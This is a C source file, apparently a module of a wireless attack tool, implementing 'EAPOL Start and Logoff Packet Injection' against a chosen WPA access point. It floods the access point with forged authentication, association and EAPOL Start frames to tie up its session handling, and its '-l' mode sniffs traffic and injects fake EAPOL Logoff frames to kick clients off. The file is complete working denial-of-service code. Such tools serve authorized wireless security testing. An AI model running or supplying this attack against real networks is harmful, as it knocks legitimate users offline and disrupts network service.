#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "eapol.h"
#include "../osdep.h"
#include "../mac_addr.h"
#include "../helpers.h"

#define EAPOL_MODE 'e'
#define EAPOL_NAME "EAPOL Start and Logoff Packet Injection"

#define GOT_BEACON 'b'
#define GOT_AUTH   'a'
#define GOT_ASSOC  's'
#define GOT_KEY1   '1'

#define BEACON_TAG_WPA1 0xDD
#define BEACON_TAG_RSN  0x30
#define BEACON_TAG_MSFT 0x0050F201

#define LLC_TYPE_EAPOL  0x888E
#define EAPOL_LOGOFF_LEN 36


struct eapol_options {
  struct ether_addr *target;
  unsigned int speed;
  unsigned char attack_type;
};

char *target_ssid = NULL;
uint16_t target_capabilities = 0x0000;
char *target_wpa1 = NULL;
char *target_rsn = NULL;

uint32_t auths = 0;
uint32_t assocs = 0;
uint32_t eapols = 0;
uint32_t starts = 0;
uint32_t logoffs = 0;
struct ether_addr cur_logoff;

void eapol_shorthelp()
{
  printf("  Floods an AP with EAPOL Start frames to keep it busy with fake sessions\n");
  printf("  and thus disables it to handle any legitimate clients.\n");
  printf("  Or logs off clients by injecting fake EAPOL Logoff messages.\n");
}

void eapol_longhelp()
{
  printf( "  Floods an AP with EAPOL Start frames to keep it busy with fake sessions\n"
	  "  and thus disables it to handle any legitimate clients.\n"
	  "  Or logs off clients by injecting fake EAPOL Logoff messages.\n"
	  "      -t <bssid>\n"
	  "         Set target WPA AP\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: 400)\n"
	  "      -l\n"
	  "         Use Logoff messages to kick clients\n");
}


void *eapol_parse(int argc, char *argv[]) {
  int opt;
  struct eapol_options *eopt = malloc(sizeof(struct eapol_options));

  eopt->target = NULL;
  eopt->attack_type = 's';
  eopt->speed = 400;

  while ((opt = getopt(argc, argv, "t:ls:")) != -1) {
    switch (opt) {
      case 't':
	eopt->target = malloc(sizeof(struct ether_addr));
	*(eopt->target) = parse_mac(optarg);
      break;
      case 's':
	eopt->speed = (unsigned int) atoi(optarg);
      break;
      case 'l':
	eopt->attack_type = 'l';
      break;
      default:
	eapol_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }

  if (! eopt->target) {
    eapol_longhelp();
    printf("\n\nTarget must be specified.\n");
    return NULL;
  }

  return (void *) eopt;
}

char *decode_cipher(char cipher) {
  static char *tkip = "TKIP";
  static char *unknown = "???";
  static char *ccmp = "CCMP";

  if (cipher == 0x02) return tkip;
  if (cipher == 0x04) return ccmp;
  return unknown;
}

char *decode_keymgmt(char kmgmt) {
  static char *psk = "PSK";
  static char *wpa = "WPA";
  static char *unknown = "???";

  if (kmgmt == 0x02) return psk;
  if (kmgmt == 0x01) return wpa;
  return unknown;
}

void decode_tag_wpa(unsigned char *tag) {
  unsigned char *ctag = tag, *atag;
  uint32_t i;

  if (tag[0] == BEACON_TAG_WPA1) {
    printf("  WPA 1 Info  : Type %d, Version %d\n", tag[5], tag[6]);
    tag += 4;
  } else {
    printf("  WPA 2 RSN   : Version %d\n", tag[2]);
  }
  printf("                Multicast cipher %02X (%s)\n", tag[7], decode_cipher(tag[7]));

  for (i = 0; i < tag[8]; i++) {
    ctag = tag + 13 + (4 * i);
    printf("                Unicast cipher   %02X (%s)\n", ctag[0], decode_cipher(ctag[0]));
  }

  for (i = 0; i < ctag[1]; i++) {
    atag = ctag + 6 + (4 * i);
    printf("                Key Mgmt Suite   %02X (%s)\n", atag[0], decode_keymgmt(atag[0]));
  }
}

void decode_beacon(struct packet *beacon) {
  unsigned char *tags = beacon->data + sizeof(struct ieee_hdr) + sizeof(struct beacon_fixed);

  target_ssid = get_ssid(beacon, NULL);
  target_capabilities = get_capabilities(beacon);
  
  printf("Received Beacon from target:\n");
  printf("  SSID        : %s\n", target_ssid);
  printf("  Capabilities: %04X\n", target_capabilities);

  while (tags < (beacon->data + beacon->len)) {
    if (tags[0] == BEACON_TAG_WPA1) {
      if (*((uint32_t *)(tags + 2)) == htobe32(BEACON_TAG_MSFT)) {
	decode_tag_wpa(tags);
	target_wpa1 = malloc(2 + tags[1]);
	memcpy(target_wpa1, tags, 2 + tags[1]);
      }
    }
    if (tags[0] == BEACON_TAG_RSN) {
      decode_tag_wpa(tags);
      target_rsn = malloc(2 + tags[1]);
      memcpy(target_rsn, tags, 2 + tags[1]);
      memset(target_rsn + tags[1], 0x00, 2); //Zero out RSN capabilities
    }
    tags += (tags[1] + 2);
  }
}

struct packet build_eapol(struct ether_addr *target, struct ether_addr *client, uint8_t rsn_version, uint64_t rsn_replay) {
  struct packet pkt;
  
  create_ieee_hdr(&pkt, IEEE80211_TYPE_DATA, 't', AUTH_DEFAULT_DURATION, *target, *client, *target, SE_NULLMAC, 0);
  add_llc_header(&pkt, LLC_TYPE_EAPOL);

  if (! target_rsn) {
    add_eapol(&pkt, 2 + target_wpa1[1], (uint8_t *) target_wpa1, 1, rsn_version, rsn_replay);
  } else {
    add_eapol(&pkt, 2 + target_rsn[1], (uint8_t *) target_rsn, 2, rsn_version, rsn_replay);
  }
  return pkt;
}

struct packet build_eapol_start_logoff(struct ether_addr *target, struct ether_addr *client, uint8_t start_logoff) {
  struct packet pkt;
  
  create_ieee_hdr(&pkt, IEEE80211_TYPE_DATA, 't', AUTH_DEFAULT_DURATION, *target, *client, *target, SE_NULLMAC, 0);
  add_llc_header(&pkt, LLC_TYPE_EAPOL);

  pkt.data[pkt.len] = 0x01;
  pkt.data[pkt.len+1] = start_logoff;
  pkt.data[pkt.len+2] = 0x00;
  pkt.data[pkt.len+3] = 0x00; 
  
  pkt.len += 4;
  return pkt;
}

struct packet eapol_logoff(struct ether_addr *target) {
  struct packet sniffed;
  struct ether_addr *bssid = NULL, *client = NULL;
  struct ieee_hdr *hdr;
  
  do {
    sniffed = osdep_read_packet();
    if (sniffed.len == EAPOL_LOGOFF_LEN) continue; //Skip own packets!
    hdr = (struct ieee_hdr *) sniffed.data;
    bssid = get_bssid(&sniffed);
    
    if (hdr->flags & 0x02) {	//FromDS
      client = get_destination(&sniffed);
    } else {
      client = get_source(&sniffed);
    }
    
    if ((hdr->type == IEEE80211_TYPE_DATA) || (hdr->type == IEEE80211_TYPE_QOSDATA)) {
      if (MAC_MATCHES(*bssid, *target)) break;
    }
  } while(1);

  logoffs++;
  MAC_COPY(cur_logoff, *client);
  return build_eapol_start_logoff(target, client, 2);
}

struct packet eapol_getpacket(void *options) {
  struct eapol_options *eopt = (struct eapol_options *) options;
  struct packet sniffed, pkt;
  struct ieee_hdr *hdr;
  struct ether_addr *bssid = NULL, *client = NULL;
  char usable_packet = 0, pack_type = 0;
  static char need_beacon = 2, blocks_auth = 0;
  static struct packet old;
  uint8_t rsn_version = 0;
  uint64_t rsn_replay = 0;
  
  if (need_beacon == 2) { old.len = 0; need_beacon = 1; } //init

  sleep_till_next_packet(eopt->speed);

  if (eopt->attack_type == 'l') return eapol_logoff(eopt->target);
  
  do {
    sniffed = osdep_read_packet();

    if (old.len == sniffed.len) {
      if (! memcmp(old.data + 2, sniffed.data + 2, old.len - 2)) {
        continue; //Its a retry, skip it
      }
    }

    old = sniffed;

    hdr = (struct ieee_hdr *) sniffed.data;

    if (hdr->type == IEEE80211_TYPE_BEACON) {
      bssid = get_bssid(&sniffed);
      if (MAC_MATCHES(*bssid, *(eopt->target))) {
	usable_packet = 1; pack_type = GOT_BEACON;
	if (need_beacon) decode_beacon(&sniffed);
	need_beacon = 0;
      }
    }

    if (! need_beacon) {
      
      if (hdr->type == IEEE80211_TYPE_AUTH) {
	usable_packet = 1; pack_type = GOT_AUTH;
	client = get_destination(&sniffed);
	if (! blocks_auth) {
	  struct auth_fixed *af = (struct auth_fixed *) (sniffed.data + sizeof(struct ieee_hdr));
	  if (af->status != AUTH_STATUS_SUCCESS) {
	    printf("\rAP starts blocking Authentication :)                           \n");
	    blocks_auth = 1;
	  }
	}
      }
      
      if (hdr->type == IEEE80211_TYPE_ASSOCRES) {
	usable_packet = 1; pack_type = GOT_ASSOC;
	client = get_destination(&sniffed);
	if (blocks_auth < 2) {
	  if ((sniffed.data[sizeof(struct ieee_hdr) + 2] != 0x00) || (sniffed.data[sizeof(struct ieee_hdr) + 3] != 0x00)) {
	    printf("\rAP starts blocking Association :)                           \n");
	    blocks_auth = 2;
	  }
	}
      }
      
      if ((hdr->type == IEEE80211_TYPE_DATA) || (hdr->type == IEEE80211_TYPE_QOSDATA)) {
	struct llc_header *llc = (struct llc_header *) (sniffed.data + sizeof(struct ieee_hdr));
	if (llc->type == htobe16(LLC_TYPE_EAPOL)) {
	  struct rsn_auth *rsn = (struct rsn_auth *) (sniffed.data + sizeof(struct ieee_hdr) + sizeof(struct llc_header));
	  usable_packet = 1; pack_type = GOT_KEY1;
	  client = get_destination(&sniffed);
	  rsn_version = rsn->version;
	  rsn_replay = rsn->replay_counter;
	}
      }

      if (client && MAC_MATCHES(*client, *(eopt->target))) usable_packet = 0; //Thats one of our packets...
    }
  } while(! usable_packet);

  switch (pack_type) {
    case GOT_BEACON:
      pkt = create_auth(*bssid, generate_mac(MAC_KIND_RANDOM), 1);
      auths++;
    break;
    case GOT_AUTH:
      pkt = create_assoc_req(*client, *(eopt->target), target_capabilities, target_ssid, 54);
      assocs++;
      if (! target_rsn) {
	if (!target_wpa1) {
	  printf("\rERROR: AP sends no WPA tags, AP does not support WPA, exiting...\n");
	  pkt.len = 0; return pkt;
	}
	memcpy(pkt.data + pkt.len, target_wpa1, target_wpa1[1] + 2);
	pkt.len += target_wpa1[1] + 2;
      } else {
	memcpy(pkt.data + pkt.len, target_rsn, target_rsn[1] + 2);
	pkt.len += target_rsn[1] + 2;
      }
    break;
    case GOT_ASSOC:
      pkt = build_eapol_start_logoff(eopt->target, client, 1);
      starts++;
    break;
    case GOT_KEY1:
      pkt = build_eapol(eopt->target, client, rsn_version, rsn_replay);
      eapols++;
    break;
    default: //Somethings wrong....
      pkt.len = 0;
  }

  return pkt;
}


void eapol_print_stats(void *options) {
  struct eapol_options *eopt = (struct eapol_options *) options;
  
  if (eopt->attack_type == 'l') {
    printf("\rLogoff messages sent: %6d    Currently Logging off: ", logoffs); print_mac(cur_logoff); printf("\n");
  } else {
    printf("\rInjected: Authentication: %6d    Association: %6d    EAP Start : %6d    EAP Key: %6d\n", auths, assocs, starts, eapols);
  }
}


void eapol_perform_check(void *options) {
  //Nothing to check
  options = options; //Avoid unused warning
}


struct attacks load_eapol() {
  struct attacks this_attack;
  char *eapol_name = malloc(strlen(EAPOL_NAME) + 1);
  strcpy(eapol_name, EAPOL_NAME);

  this_attack.print_shorthelp = (fp) eapol_shorthelp;
  this_attack.print_longhelp = (fp) eapol_longhelp;
  this_attack.parse_options = (fpo) eapol_parse;
  this_attack.get_packet = (fpp) eapol_getpacket;
  this_attack.print_stats = (fps) eapol_print_stats;
  this_attack.perform_check = (fps) eapol_perform_check;
  this_attack.mode_identifier = EAPOL_MODE;
  this_attack.attack_name = eapol_name;

  return this_attack;
}
